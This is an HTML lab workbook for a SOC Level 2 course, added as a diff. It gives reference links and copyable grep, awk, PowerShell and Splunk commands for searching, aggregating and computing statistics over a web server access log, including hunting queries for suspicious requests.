@@ -1,0 +1,3357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SOC Level 2 - Lab Workbook</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #fafafa;
+    color: #222;
+    max-width: 800px;
+    margin: 40px auto;
+    padding: 0 20px;
+  }
+  h1 {
+    margin-top: 50px;
+    border-bottom: 1px solid #ddd;
+    padding-bottom: 5px;
+  }
+  #toc {
+    background: #f4f4f4;
+    border: 1px solid #ddd;
+    border-radius: 6px;
+    padding: 15px;
+    margin-bottom: 30px;
+    max-height: 300px;
+    overflow-y: auto; 
+  }
+  #toc h2 {
+    margin-top: 0;
+    font-size: 18px;
+  }
+  #toc ul {
+    list-style: none;
+    padding-left: 0;
+    margin: 0;
+  }
+  #toc li {
+    margin: 5px 0;
+  }
+  #toc a {
+    text-decoration: none;
+    color: #007acc;
+  }
+  #toc a:hover {
+    text-decoration: underline;
+  }
+  .code-block {
+    position: relative;
+    background: #f4f4f4;
+    border: 1px solid #ddd;
+    border-radius: 6px;
+    margin: 20px 0;
+    font-family: Consolas, monospace;
+    overflow: hidden;
+  }
+.code-block pre {
+  margin: 0;
+  padding: 15px;
+  padding-right: 60px;
+  white-space: pre;
+  font-size: 16px;
+  overflow-x: auto;
+}
+  .copy-btn {
+    position: absolute;
+    top: 6px;
+    right: 6px;
+    padding: 3px 8px;
+    border: none;
+    background: #007acc;
+    color: white;
+    font-size: 12px;
+    border-radius: 4px;
+    cursor: pointer;
+    opacity: 0.85;
+  }
+  .copy-btn:hover {
+    opacity: 1;
+    background: #005f99;
+  }
+  ul {
+    margin-top: 25px;
+  }
+
+  .toggle-btn {
+    background: #007acc;
+    color: white;
+    border: none;
+    padding: 6px 12px;
+    cursor: pointer;
+    border-radius: 4px;
+    font-size: 14px;
+  }
+
+  .toggle-btn:hover {
+    background: #005f99;
+  }
+
+  .hidden-content {
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+<div id="toc">
+  <h2>Table of Contents</h2>
+  <ul id="toc-list"></ul>
+</div>
+
+<!---->
+<h1>The Modern Adversary</h1>
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/m-trends">Mandiant (Google Cloud Security): M-Trends Report</a></li>
+  <li><a target="_blank" href="https://soc201.com/4QfOrw">North Korean Job-Related Cyber Campaigns (Palo Alto Networks Unit 42)</a></li>
+</ul>
+<!---->
+
+<!---->
+<h1>Introduction to Incident Response</h1>
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/800-61-rev2">NIST SP 800-61 Rev. 2 (Computer Security Incident Handling Guide)</a></li>
+  <li><a target="_blank" href="https://soc201.com/800-61-rev3">NIST SP 800-61 Rev. 3 (Incident Response Recommendations and Considerations for Cybersecurity Risk Management: A CSF 2.0 Community Profile)</a></li>
+  <li><a target="_blank" href="https://soc201.com/sans-ihh">SANS - Incident Handler's Handbook</a></li>
+  <li><a target="_blank" href="https://soc201.com/800-84">NIST SP 800-84 (Guide to Test, Training, and Exercise Programs for IT Plans and Capabilities)</a></li>
+  <li><a target="_blank" href="https://soc201.com/b&b">Backdoors & Breaches (Black Hills Information Security)</a></li>
+  <li><a target="_blank" href="https://soc201.com/cis-benchmarks">CIS Benchmarks (Center for Internet Security)</a></li>
+  <li><a target="_blank" href="https://soc201.com/ooda">The OODA Loop (The Decision Lab)</a></li>
+</ul>
+<!---->
+
+<!---->
+<h1>Introduction to Threat Hunting</h1>
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/hmm">The Hunting Maturity Model (David Bianco)</a></li>
+  <li><a target="_blank" href="https://soc201.com/th-playbook">Threat Hunter Playbook</a></li>
+  <li><a target="_blank" href="https://soc201.com/ih-ds">Intrusion Hunting for the Masses A Practical Guide by David Sharpe</a></li>
+  <li><a target="_blank" href="https://soc201.com/lm-hc">Lateral Movement by Harlan Carvey</a></li>
+</ul>
+<!---->
+
+<!---->
+<h1>Cyber Threat Intelligence</h1>
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/attack">MITRE ATT&CK</a></li>
+  <li><a target="_blank" href="https://soc201.com/cs-apt">Crowdstrike - APTs & Adversary Groups</a></li>
+  <li><a target="_blank" href="https://soc201.com/ckc">Lockheed Martin - The Cyber Kill Chain</a></li>
+<li><a target="_blank" href="https://soc201.com/dfir-report">The DFIR Report</a></li>
+<li><a target="_blank" href="https://soc201.com/olaf-th">ThreatHunting Splunk App - Olaf Hartong</a></li>
+<li><a target="_blank" href="https://soc201.com/thp">ThreatHuntingProject - GitHub</a></li>
+<li><a target="_blank" href="https://soc201.com/th-kql">KQL Threat Hunting Queries</a></li>
+<li><a target="_blank" href="https://soc201.com/navigator">MITRE ATT&CK Navigator</a></li>
+<li><a target="_blank" href="https://soc201.com/attack-cti">MITRE - Enterprise ATT&CK CTI</a></li>
+</ul>
+<!---->
+ 
+<!---->
+<h1>Searching in the Command-Line</h1>
+
+<h4>Navigate to the lab directory</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cd ~/Desktop/Class_Files/labs/abb6ded2_web</pre>
+</div>
+
+<h4>Retrieve wordcount (lines)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>wc -l access.log</pre>
+</div>
+
+<h4>Search for a keyword with Grep</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>grep "login" access.log</pre>
+</div>
+
+<h4>Regex with Grep</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>grep -E 'login|contact' access.log</pre>
+</div>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>grep -E "\.(jpg|png|gif)" access.log</pre>
+</div>
+
+<h4>Reverse search (filter out) with Grep</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>grep -v "wp-login.php" access.log</pre>
+</div>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>grep -v -E "wp-login.php|xmlrpc.php" access.log</pre>
+</div>
+
+<h4>Return matching line numbers with Grep</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>grep "26/May/2025:12:23:33 -0400" access.log -n</pre>
+</div>
+
+<h4>Count the number of matches with Grep</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>grep "26/May/2025:12:23:33 -0400" access.log -c</pre>
+</div>
+
+<h4>Return additional context with Grep</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>grep ".png" access.log -B 1</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>grep ".png" access.log -A 3</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>grep ".png" access.log -C 2</pre>
+</div>
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/grep">Grep Manual Page</a></li>
+<li><a target="_blank" href="https://soc201.com/regex101">Regex101</a></li>
+</ul>
+<!---->
+
+
+<h1>Searching in PowerShell</h1>
+
+<h4>Change directory to the lab folder</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cd C:\Users\tcm\Desktop\Class_Files\labs\abb6ded2_web</pre>
+</div>
+
+<h4>Display the contents of access.log</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Content .\access.log</pre>
+</div>
+
+<h4>Show the alias for Get-Content</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Alias -Definition Get-Content</pre>
+</div>
+
+<h4>Count the number of lines in access.log</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>(Get-Content .\access.log).Count</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cat .\access.log | Measure-Object -Line -Word -Character</pre>
+</div>
+
+<h4>Search for a keyword in access.log</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Select-String -Pattern "wp-login.php" -Path .\access.log</pre>
+</div>
+
+<h4>Search for a keyword and display only the matching lines</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Select-String -Pattern "login" -Path .\access.log | ForEach-Object { $_.Line }</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Select-String -Pattern "login" -Path .\access.log | % { $_.Line }</pre>
+</div>
+
+<h4>Count matches</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>(findstr "wp-login.php" .\access.log).Count</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>(Select-String -Pattern "wp-login.php" -Path .\access.log).Count</pre>
+</div>
+
+<h4>Search for a keyword with case sensitivity</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Select-String -Pattern "LOGIN" -Path .\access.log -CaseSensitive</pre>
+</div>
+
+<h4>Search for lines not containing a keyword (reverse search) with case sensitivity</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Select-String -Pattern "GET" -Path .\access.log -NotMatch -CaseSensitive</pre>
+</div>
+
+<h4>Show context lines around a keyword match</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Select-String -Pattern "26/May/2025:10:08:58 -0400" -Path .\access.log -Context 2</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Select-String -Pattern "26/May/2025:10:08:58 -0400" -Path .\access.log -Context 0,2</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Select-String -Pattern "26/May/2025:10:08:58 -0400" -Path .\access.log -Context 5,0</pre>
+</div>
+
+<h4>Quiet (boolean) search against a keyword</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Select-String -Pattern "login" -Path .\access.log -Quiet</pre>
+</div>
+
+<h4>Search for regex patterns</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Select-String -Pattern "\.(jpg|png|gif)" -Path .\access.log</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/grep">Grep Manual Page</a></li>
+<li><a target="_blank" href="https://soc201.com/BcCPAz">PowerShell Regular Expressions (Regex)</a></li>
+<li><a target="_blank" href="https://soc201.com/regex101">Regex101</a></li>
+</ul>
+
+
+<h1>Searching in Splunk</h1>
+
+<h4>Basic keyword search</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" login</pre>
+</div>
+
+<h4>Search by field and value</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" uri_path="/wp-login.php"</pre>
+</div>
+
+<h4>Compound searches</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" uri_path="/wp-login.php" AND clientip="95.104.164.170"</pre>
+</div>
+
+<h4>Exclude a specific value</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" uri_path="/wp-login.php" AND clientip!="95.104.164.170"</pre>
+</div>
+
+<h4>Using comparison operators</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" uri_path="/wp-login.php" AND clientip!="95.104.164.170" AND status &gt; 200</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" uri_path="/wp-login.php" AND clientip!="95.104.164.170" AND status IN (200, 302)</pre>
+</div>
+
+<h4>Checking field existence</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| where isnotnull(clientip)</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" AND clientip=*</pre>
+</div>
+
+<h4>Partial match using wildcards</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" uri_path="*support*"</pre>
+</div>
+
+<h4>Regex pattern matching</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" | regex uri_path="^/wp-login\.php$"</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| regex clientip="^\d{1,3}(\.\d{1,3}){3}$"
+| table clientip</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| rex field=clientip "(?&lt;valid_ip&gt;\d{1,3}(\.\d{1,3}){3})"
+| table valid_ip</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/spl">SPL Syntax - Splunk</a></li>
+<li><a target="_blank" href="https://soc201.com/kql-ms">KQL Syntax - Microsoft</a></li>
+<li><a target="_blank" href="https://soc201.com/kql-elk">KQL Syntax - Elastic</a></li>
+<li><a target="_blank" href="https://soc201.com/regex101">Regex101</a></li>
+</ul>
+
+<h1>Aggregations in the Command-Line</h1>
+
+<h4>Print the first line and first field</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>head -n 1 access.log | awk '{print $1}'</pre>
+</div>
+
+<h4>Return user agent strings</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>head -n 1 access.log | awk -F"\"" '{print $6}'</pre>
+</div>
+
+<h4>Return request string</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>head -n 1 access.log | awk -F"\"" '{print $2}'</pre>
+</div>
+
+<h4>Return IP addresses</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cut -d " " -f 1 access.log</pre>
+</div>
+
+<h4>Count unique IP addresses</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cut -d " " -f 1 access.log | sort | uniq -c</pre>
+</div>
+
+<h4>Aggregate the top 5 IP addresses</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cut -d " " -f 1 access.log | sort | uniq -c | sort -nr | head -n 5</pre>
+</div>
+
+<h4>Aggregate the top 5 pages accessed</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cut -d "\"" -f 2 access.log | sort | uniq -c | sort -nr | head -n 5</pre>
+</div>
+
+<h4>Surface the rare pages accessed</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cut -d "\"" -f 2 access.log | sort | uniq -c | sort -nr | tail -n 5</pre>
+</div>
+
+<h4>Surgace the unique IPs accessing a specific page</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>grep "wp-login.php" access.log | awk '{print $1}' | sort | uniq -c | sort -nr</pre>
+</div>
+
+<h4>Aggregate user agents from a specific IP</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>grep "95.104.164.170" access.log | awk -F "\"" '{print $6}' | sort | uniq -c | sort -nr</pre>
+</div>
+
+
+<h1>Aggregations in PowerShell</h1>
+
+<h4>Return IP addresses</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Content .\access.log | ForEach-Object { $_.Split(' ')[0] }</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Content .\access.log | % { $_.Split(' ')[0] }</pre>
+</div>
+
+<h4>Unique IP addresses</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Content .\access.log | % { $_.Split(' ')[0] } | Group-Object</pre>
+</div>
+
+<h4>Top 5 IP addresses by access count</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Content .\access.log | % { $_.Split(' ')[0] } | Group-Object | Sort-Object Count -Descending | Select-Object Name,Count -First 5</pre>
+</div>
+
+<h4>Unique IPs accessing a keyword</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>findstr "wp-login.php" .\access.log | % { $_.Split(' ')[0] } | Group-Object | Sort-Object Count -Descending | Select-Object Name,Count</pre>
+</div>
+
+<h4>Aggregate user agents from a specific IP</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>findstr "95.104.164.170" .\access.log | % { $_.Split('\"')[5] } | Group-Object | Sort-Object Count -Descending | Select-Object Name,Count</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/kJohvZ">PowerShell - Group-Object</a></li>
+</ul>
+
+
+<h1>Aggregations in Splunk</h1>
+
+<h4>Count events by user agent</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats count by useragent</pre>
+</div>
+
+<h4>Count distinct user agents by client IP</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| stats dc(useragent) as unique_user_agents by clientip</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| stats distinct_count(useragent) as unique_user_agents by clientip</pre>
+</div>
+
+<h4>Distinct user agents sorted by count</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| stats distinct_count(useragent) as unique_user_agents by clientip
+| sort - unique_user_agents</pre>
+</div>
+
+<h4>Top 5 client IPs by distinct user agents (dc)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| stats dc(useragent) as unique_user_agents by clientip
+| sort - unique_user_agents
+| head 5</pre>
+</div>
+
+<h4>Top 5 client IPs by estimated distinct user agents</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| stats estdc(useragent) as unique_user_agents by clientip
+| sort - unique_user_agents
+| head 5</pre>
+</div>
+
+<h4>Sum bytes by client IP</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| stats sum(bytes) as total_bytes by clientip
+| sort - total_bytes</pre>
+</div>
+
+<h4>Sum bytes filtered by minimum threshold</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| stats sum(bytes) as total_bytes by clientip
+| where total_bytes &gt;= 12248
+| sort - total_bytes</pre>
+</div>
+
+<h4>Show client IP, URI, and bytes</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web"
+| fields clientip, uri, bytes
+| sort bytes
+| table clientip, uri, bytes</pre>
+</div>
+
+<h4>All URIs for a specific client IP (list)</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" clientip="95.104.164.170" 
+| stats list(uri_path) as all_uris</pre>
+</div>
+
+<h4>All URIs grouped by client IP</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats list(uri_path) as all_uris by clientip</pre>
+</div>
+
+<h4>All URIs values for a specific client IP</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" clientip="95.104.164.170" 
+| stats values(uri) as all_uris by clientip</pre>
+</div>
+
+<h4>Count events by URI and sort</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" clientip="95.104.164.170"
+| stats count by uri
+| sort - count</pre>
+</div>
+
+<h4>First occurrence of URI for a client IP</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" clientip="95.104.164.170" uri="*?cmd*"
+| sort 0 _time
+| stats first(uri)</pre>
+</div>
+
+<h4>Last occurrence of URI for a client IP</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" clientip="95.104.164.170" uri="*?cmd*"
+| sort 0 _time
+| stats last(uri)</pre>
+</div>
+
+<h4>URL decode last occurrence of URI</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" clientip="95.104.164.170" uri="*?cmd*"
+| sort 0 _time
+| eval decoded_uri=urldecode(uri)
+| stats last(decoded_uri) as last_decoded_uri</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/N0fHF1">Splunk - Aggregate Functions</a></li>
+<li><a target="_blank" href="https://soc201.com/ayYDzO">Microsoft KQL - Aggregate Functions</a></li>
+<li><a target="_blank" href="https://soc201.com/IrlQDO">Elastic - Aggregate Functions</a></li>
+</ul>
+
+
+<h1>Statistics in the Command-Line</h1>
+
+<h4>Calculate mean</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>awk '{sum += $10; count++} END {print "Mean:", sum/count}' access.log</pre>
+</div>
+
+<h4>Calculate median</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>awk '{print $10}' access.log | sort -n | awk '{a[NR]=$1} END {if (NR%2) print "Median:", a[(NR+1)/2]; else print "Median:", (a[NR/2]+a[(NR/2)+1])/2}'</pre>
+</div>
+
+<h4>Calculate mode</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>awk '{print $10}' access.log | sort | uniq -c | sort -nr | head -n 1</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>awk '{print $10}' access.log | sort | uniq -c | sort -nr | head -n 1 | awk '{print "Mode:", $2}'</pre>
+</div>
+
+<h4>Calculate standard deviation</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>awk '{n++; x+=$10; x2+=($10)^2} END {print "Stdev:", sqrt((x2/n)-(x/n)^2)}' access.log</pre>
+</div>
+
+<h4>Aggregate statistics using datamash</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>awk '{print $10}' access.log | datamash mean 1 median 1 mode 1 sstdev 1 min 1 max 1</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>cut -d ' ' -f 10 access.log | datamash mean 1 median 1 mode 1 sstdev 1 min 1 max 1</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>awk '{print $10}' access.log | datamash mean 1 median 1 mode 1 sstdev 1 min 1 max 1 | awk '{printf "Mean: %s\nMedian: %s\nMode: %s\nStandard Deviation: %s\nMin: %s\nMax: %s\n", $1, $2, $3, $4, $5, $6}'</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/j6yePE">Measures of Central Tendency (Laerd Statistics)</a></li>
+<li><a target="_blank" href="https://soc201.com/VmTSZI">Standard Deviation (Investopedia)</a></li>
+<li><a target="_blank" href="https://soc201.com/MVZ7c2">Python - Statistics</a></li>
+<li><a target="_blank" href="https://soc201.com/ZEtLYy">GNU Datamash</a></li>
+</ul>
+
+<h1>Statistics in PowerShell</h1>
+
+<h4>Extract bytes</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Content .\access.log | % { $_.Split(' ')[9] }</pre>
+</div>
+
+<h4>Cast strings as integers</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Content .\access.log | % { $_.Split(' ')[9] -as [int] }</pre>
+</div>
+
+<h4>Avoid null values</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>Get-Content .\access.log | % { $_.Split(' ')[9] -as [int] } | ? { $_ -ne $null }</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$bytes = Get-Content .\access.log | % { $_.Split(' ')[9] -as [int] } | ? { $_ -ne $null }</pre>
+</div>
+
+<h4>Mean</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$mean = ($bytes | Measure-Object -Average).Average</pre>
+</div>
+
+<h4>Median</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$median = &amp; { $s=$bytes|Sort-Object; $c=$s.Count; if($c%2){$s[($c-1)/2]}else{[math]::Round(($s[$c/2-1]+$s[$c/2])/2,2)} }</pre>
+</div>
+
+<h4>Mode</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$mode = ($bytes | Group-Object | Sort-Object Count -Descending | Select-Object -First 1).Name</pre>
+</div>
+
+<h4>Standard deviation</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$stddev = [math]::Sqrt( (($bytes | % { ($_ - $mean) * ($_ - $mean) } | Measure-Object -Sum).Sum) / ($bytes.Count - 1) )</pre>
+</div>
+
+<h4>Minimum</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$min = ($bytes | Measure-Object -Minimum).Minimum</pre>
+</div>
+
+<h4>Maximum</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$max = ($bytes | Measure-Object -Maximum).Maximum</pre>
+</div>
+
+<h4>All statistics together</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>"Mean: $mean`nMedian: $median`nMode: $mode`nStdDev: $stddev`nMin: $min`nMax: $max"</pre>
+</div>
+
+<h4>Stats with Measure-Object</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>$bytes | Measure-Object -Sum -Average -Maximum -Minimum</pre>
+</div>
+
+
+<h2>References</h2>
+<ul>
+<li><a target="_blank" href="https://soc201.com/j6yePE">Measures of Central Tendency (Laerd Statistics)</a></li>
+<li><a target="_blank" href="https://soc201.com/VmTSZI">Standard Deviation (Investopedia)</a></li>
+<li><a target="_blank" href="https://soc201.com/MVZ7c2">Python - Statistics</a></li>
+<li><a target="_blank" href="https://soc201.com/Ebr8Lb">PowerShell Measure-Object</a></li>
+</ul>
+
+<h1>Statistics in Splunk</h1>
+
+<h4>Mean</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats avg(bytes)</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats avg(bytes) BY clientip</pre>
+</div>
+
+<h4>Median</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats median(bytes)</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats median(bytes) AS "Median Bytes" by useragent</pre>
+</div>
+
+<h4>Mode</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats mode(bytes)</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats mode(bytes) as "Mode Bytes" by useragent</pre>
+</div>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats count BY bytes
+| sort -count
+| head 1</pre>
+</div>
+
+<h4>Standard deviation of bytes</h4>
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>index="abb6ded2_web" 
+| stats stdev(bytes)</pre>
+</div>
+
